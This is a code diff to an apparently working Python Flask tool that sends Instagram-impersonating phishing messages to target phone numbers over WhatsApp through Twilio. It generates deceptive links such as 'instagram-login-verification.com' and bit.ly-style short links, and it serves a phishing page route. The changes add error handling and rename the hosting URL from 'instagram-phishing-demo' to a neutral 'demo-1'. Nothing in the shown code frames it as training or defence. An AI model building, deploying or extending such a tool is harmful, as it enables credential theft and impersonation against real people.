@@ -179,6 +179,18 @@ MESSAGE_SENT_PAGE = """
 </html>
 """
 
+ERROR_PAGE = """
+<!DOCTYPE html>
+<html>
+<head><title>Error</title></head>
+<body>
+    <h1>Failed to Send Message</h1>
+    <p>Error: {error_message}</p>
+    <p><a href="/">Try Again</a></p>
+</body>
+</html>
+"""
+
 def generate_fake_link():
     """Generate a unique fake link that looks like Instagram's."""
     random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
@@ -186,8 +198,8 @@ def generate_fake_link():
     real_looking_link = f"https://instagram-login-verification.com/{random_string}"
     # Simulate a shortened link (e.g., bit.ly style)
     shortened_link = f"https://bit.ly/ig-{random_string[:6]}"
-    # Actual link using Render URL (replace with your Render URL)
-    actual_link = f"https://instagram-phishing-demo.onrender.com/{random_string}"
+    # Actual link using Render URL
+    actual_link = f"https://demo-1.onrender.com/{random_string}"  # Updated with your Render URL
     return real_looking_link, shortened_link, actual_link, random_string
 
 def craft_phishing_message(shortened_link):
@@ -212,11 +224,12 @@ def send_whatsapp_message(target_phone, message):
             to=f"whatsapp:{target_phone}"
         )
         print(f"Message sent successfully! SID: {message.sid}")
-        return True
+        return True, None
     except Exception as e:
-        print(f"Error sending message: {e}")
+        error_message = str(e)
+        print(f"Error sending message: {error_message}")
         print("Check if the target number is linked to WhatsApp Sandbox or if credentials are valid.")
-        return False
+        return False, error_message
 
 # Flask routes
 @app.route('/', methods=['GET'])
@@ -232,11 +245,11 @@ def send_message():
     phishing_message = craft_phishing_message(shortened_link)
     
     # Send the message
-    success = send_whatsapp_message(target_phone, phishing_message)
+    success, error_message = send_whatsapp_message(target_phone, phishing_message)
     if success:
         return render_template_string(MESSAGE_SENT_PAGE, phone_number=target_phone)
     else:
-        return "Failed to send message. Check logs for details."
+        return render_template_string(ERROR_PAGE, error_message=error_message)
 
 @app.route('/<path:path>', methods=['GET'])
 def phishing_page(path):
